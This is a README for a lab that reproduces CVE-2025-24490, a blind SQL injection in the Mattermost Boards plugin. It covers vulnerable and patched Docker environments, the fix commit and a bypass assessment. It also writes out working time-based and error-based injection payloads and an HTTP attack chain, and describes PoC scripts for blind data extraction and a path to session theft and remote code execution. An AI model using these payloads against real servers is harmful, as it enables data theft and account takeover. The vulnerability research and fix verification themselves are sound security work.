# CVE-2025-24490: Mattermost Boards Plugin SQL Injection

> **Exploit Intelligence Platform** | [exploit-intel.com](https://exploit-intel.com) | [@exploit_intel](https://x.com/exploit_intel)

## Overview

| Field | Value |
|-------|-------|
| **CVE ID** | CVE-2025-24490 |
| **Vendor** | Mattermost |
| **Product** | Mattermost Server (Boards / Focalboard Plugin) |
| **Vulnerability** | SQL Injection (Blind) |
| **CWE** | CWE-89 — Improper Neutralization of Special Elements used in an SQL Command |
| **CVSS** | **9.6 CRITICAL** — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N` |
| **Affected** | Mattermost Server ≤ 10.4.1, ≤ 10.3.2, ≤ 10.2.2, ≤ 9.11.7; Boards Plugin ≤ v9.0.4 |
| **Fixed** | 10.4.2, 10.3.3, 10.2.3, 9.11.8; Boards Plugin v9.0.5 |
| **Fix Commit** | [`47f29e1`](https://github.com/mattermost/mattermost-plugin-boards/commit/47f29e1bcea11b5b4576c8305e0e0eb5745c37bd) |
| **Fix Author** | Harshil Sharma |

## Vulnerability Details

Two SQL store functions in the Mattermost Boards plugin (focalboard) construct `UPDATE` queries using the Squirrel query builder. Both functions build `CASE WHEN` expressions by directly concatenating user-supplied string IDs into SQL string literals instead of using parameterized placeholders.

**Vulnerable code pattern** (`server/services/store/sqlstore/category.go:221`):
```go
updateCase = updateCase.When("'"+categoryID+"'", sq.Expr(fmt.Sprintf("%d", i*categorySortOrderGap)))
```

When an attacker supplies a category ID containing SQL metacharacters (e.g., `'||(SELECT '' FROM pg_sleep(5))||'`), the manually applied quotes are broken and the injected SQL fragment becomes part of the executed query:

```sql
UPDATE focalboard_categories SET sort_order = CASE id
  WHEN '' || (SELECT '' FROM pg_sleep(5)) || '' THEN 0
  ...
  ELSE sort_order END
WHERE user_id = $1 AND team_id = $2
```

The `WHERE` clause uses proper parameterization, but the `WHEN` values are inline string literals under attacker control. Two contributing factors enable exploitation:

1. **No input validation on category creation**: `Category.Hydrate()` only generates an ID if the supplied one is empty; `Category.IsValid()` only checks for non-emptiness. Any string ≤36 characters is accepted and stored.
2. **No validation on board IDs**: The `handleUpdateCategoryBoard` endpoint accepts arbitrary `boardID` strings from the URL path, storing them directly in the database.

The `id` and `board_id` columns are `VARCHAR(36)`, constraining payloads to ≤36 characters — but time-based blind (`'||(SELECT '' FROM pg_sleep(5))||'` at 34 chars) and error-based (`'||(1/0)::text||'` at 17 chars) payloads fit comfortably.

## Attack Chain

```
1. POST /api/v4/users/login                    → Authenticate, get session token
2. GET  /api/v4/users/me/teams                  → Get team ID
3. POST /plugins/focalboard/api/v2/teams/{t}/categories
   Body: {"id": "'||(SELECT '' FROM pg_sleep(5))||'", ...}
                                                → Store malicious category ID
4. GET  /plugins/focalboard/api/v2/teams/{t}/categories
                                                → List all category IDs
5. PUT  /plugins/focalboard/api/v2/teams/{t}/categories/reorder
   Body: ["<id1>", "'||(SELECT '' FROM pg_sleep(5))||'", "<id2>"]
                                                → SQL injection fires in CASE WHEN
```

**Escalation path**: SQLi → Session Token Theft → Admin Impersonation → RCE via Malicious Plugin Upload

## Lab Setup

### Prerequisites

- Docker Engine with Compose plugin
- ~2 GB disk space for container images
- `jq` installed on the host (used by setup scripts)

### Architecture

```
┌──────────────────────────────────────────────────────────────┐
│                    Vulnerable Environment                     │
│  ┌──────────────────────┐    ┌────────────────────────────┐  │
│  │   cve-2025-24490-db  │    │ cve-2025-24490-mattermost  │  │
│  │     postgres:15      │◄───│     MM Enterprise 9.11.7   │  │
│  │                      │    │    focalboard v8.0.0        │  │
│  └──────────────────────┘    └────────────────────────────┘  │
│              lab-net                  :8065 → host :8065      │
└──────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────┐
│                     Patched Environment                       │
│  ┌──────────────────────────┐  ┌─────────────────────────┐   │
│  │ cve-2025-24490-db-patched│  │ cve-2025-24490-mm-patch │   │
│  │       postgres:15        │◄─│   MM Enterprise 9.11.8  │   │
│  │                          │  │   focalboard v9.0.5     │   │
│  └──────────────────────────┘  └─────────────────────────┘   │
│            lab-net-patched             :8065 → host :8066     │
└──────────────────────────────────────────────────────────────┘
```

### Quick Start

```bash
# Vulnerable environment (Mattermost 9.11.7 + PostgreSQL 15)
docker compose up -d
docker compose exec mattermost curl -sf http://localhost:8065/api/v4/system/ping  # wait for OK
bash setup_mattermost.sh http://localhost:8065

# Patched environment (Mattermost 9.11.8 + PostgreSQL 15)
docker compose -f docker-compose-patched.yml up -d
bash setup_mattermost_patched.sh http://localhost:8066

# Run exploit against vulnerable
python3 poc/poc.py localhost 8065

# Tear down
docker compose down -v
docker compose -f docker-compose-patched.yml down -v
```

### Credentials

| Field | Value |
|-------|-------|
| Admin Username | `admin` |
| Admin Password | `Admin123!@#` |
| Admin Email | `admin@test.local` |
| Team Name | `testteam` |
| DB User | `mmuser` |
| DB Password | `mmuser_password` |

### Important Notes

- The focalboard plugin is **prepackaged but NOT auto-installed** in Mattermost 9.11.x. The setup scripts handle plugin upload and activation.
- Auth tokens may expire. Re-authenticate via `POST /api/v4/users/login` if needed.

## PoC Usage

All PoC scripts use **Python 3 stdlib only** (no external dependencies).

### PoC 1: Time-Based Blind SQLi — Category Reorder (Primary Vector)

Demonstrates the primary injection point in `reorderCategories()` using `pg_sleep()` for time-based confirmation.

```bash
python3 poc/poc.py localhost 8065
```

**Expected output (vulnerable):**
```
[*] Creating category with SQL injection payload as ID...
    Payload: '||(SELECT '' FROM pg_sleep(5))||'
[+] Category created with malicious ID (HTTP 200)
[*] Triggering SQL injection via category reorder...
[*] Response received:
    HTTP Status:  200
    Elapsed time: 5.01 seconds
[+] SQL INJECTION CONFIRMED!
    Response was delayed by 5.01s (threshold: 4s)
    pg_sleep(5) executed successfully in database context
```

### PoC 2: Time-Based Blind SQLi — Board Reorder (Secondary Vector)

Exploits the second injection point in `reorderCategoryBoards()` via the board ID URL path parameter.

```bash
python3 poc/poc_vector2.py localhost 8065
```

### PoC 3: Error-Based Boolean Oracle

Uses division-by-zero (`1/0`) vs safe division (`1/1`) to create a boolean oracle — HTTP 200 for success, HTTP 500 for error.

```bash
python3 poc/poc_vector3.py localhost 8065
```

### PoC 4: Blind Data Extraction

Combines timing calibration, table probing, and character-by-character extraction to demonstrate real data exfiltration from the Mattermost database.

```bash
python3 poc/poc_extract.py localhost 8065
```

### Supplementary Scripts

| Script | Purpose |
|--------|---------|
| `poc/fix_verification.py` | Side-by-side comparison of vulnerable vs patched instances |
| `poc/bypass_poc.py` | Comprehensive bypass analysis (5 techniques tested against patched version) |

## Verification: Vulnerable vs Patched

| Test | Vulnerable (9.11.7) | Patched (9.11.8) |
|------|---------------------|-------------------|
| Create category with SQLi ID | HTTP 200 — malicious ID stored as-is | HTTP 200 — ID overwritten by `PreCreate()` to server-generated value |
| List categories shows SQLi ID | `'||(SELECT '' FROM pg_sleep(5))||'` visible | Only server-generated IDs (e.g., `7ac5w4opkb...`) |
| Reorder with pg_sleep(5) | HTTP 200 after **5.01 seconds** — INJECTED | HTTP 200 after **0.00 seconds** — BLOCKED |
| Error oracle (1/0 division) | HTTP **500** (error propagated) — INJECTED | N/A — malicious ID never stored |
| Board reorder via URL path | HTTP 200 after **3.01 seconds** — INJECTED | HTTP 200 after **0.01 seconds** — BLOCKED |

## Fix

### Commit: [`47f29e1`](https://github.com/mattermost/mattermost-plugin-boards/commit/47f29e1bcea11b5b4576c8305e0e0eb5745c37bd)

The fix applies three defensive layers:

**Layer 1 — SQL Parameterization (Root Cause Fix)**

```go
// BEFORE (vulnerable):
updateCase = updateCase.When("'"+categoryID+"'", sq.Expr(fmt.Sprintf("%d", ...)))

// AFTER (fixed):
updateCase = updateCase.When(sq.Expr("?", categoryID), sq.Expr(fmt.Sprintf("%d", ...)))
```

**Layer 2 — Input Validation (Defense-in-Depth)**: New `IsValidId()` function rejects any ID not matching the 27-character Mattermost ID format.

**Layer 3 — Server-Side ID Generation**: New `PreCreate()` method forces server-generated IDs, unconditionally overwriting user-supplied values.

### Fix Assessment

**The fix is comprehensive.** SQL parameterization alone (Layer 1) is sufficient to prevent the vulnerability. Layers 2 and 3 provide defense-in-depth. No bypass was found across five distinct bypass techniques tested against the patched version.

**Minor defense-in-depth gap**: The `handleUpdateCategoryBoard` endpoint still accepts arbitrary board IDs from the URL path without `IsValidId()` validation. These strings are stored but cannot trigger SQL injection due to parameterization.

## Files

| File | Description |
|------|-------------|
| `README.md` | This writeup |
| `docker-compose.yml` | Vulnerable environment (Mattermost 9.11.7 + PostgreSQL 15) |
| `docker-compose-patched.yml` | Patched environment (Mattermost 9.11.8 + PostgreSQL 15) |
| `setup_mattermost.sh` | Setup script — creates admin user, team, installs focalboard plugin (vulnerable) |
| `setup_mattermost_patched.sh` | Setup script for patched environment |
| `poc/poc.py` | Primary PoC — time-based blind SQLi via category reorder |
| `poc/poc_vector2.py` | Secondary vector — time-based blind SQLi via board reorder |
| `poc/poc_vector3.py` | Error-based boolean oracle (1/0 division) |
| `poc/poc_extract.py` | Data extraction (table probing + timing) |
| `poc/fix_verification.py` | Vulnerable vs patched side-by-side comparison |
| `poc/bypass_poc.py` | Bypass analysis — 5 techniques, all fail on patched |
| `intel_brief.md` | CVE intelligence brief |
| `vulnerability_analysis.md` | Root cause analysis and fix assessment |
| `lab_build_report.md` | Lab construction and verification |
| `poc_verification_report.md` | PoC test results and evidence |
| `bypass_analysis.md` | Fix bypass analysis (no bypass found) |

## References

| Type | URL |
|------|-----|
| NVD Entry | https://nvd.nist.gov/vuln/detail/CVE-2025-24490 |
| GitHub Advisory | https://github.com/advisories/GHSA-p4jg-qmjv-9x26 |
| Vendor Advisory | https://mattermost.com/security-updates |
| Fix Commit | https://github.com/mattermost/mattermost-plugin-boards/commit/47f29e1bcea11b5b4576c8305e0e0eb5745c37bd |
| Fix PR | https://github.com/mattermost/mattermost-plugin-boards/pull/55 |
| Boards Plugin Repo | https://github.com/mattermost/mattermost-plugin-boards |

## Timeline

| Date | Event |
|------|-------|
| 2025-01-22 | Fix committed by Harshil Sharma |
| 2025-02-24 | CVE-2025-24490 published (NVD) |
| 2025-02-24 | Mattermost releases patched versions (9.11.8, 10.2.3, 10.3.3, 10.4.2) |
| 2025-02-24 | Boards plugin v9.0.5 released |

## Disclaimer

This proof-of-concept is provided for **authorized security testing and educational purposes only**. Do not use against systems you do not own or have explicit written authorization to test. Unauthorized access to computer systems is illegal. If you discover this vulnerability in a production system, notify the vendor. The authors assume no liability for misuse.

---

**MIT License** | [Exploit Intelligence Platform](https://exploit-intel.com)
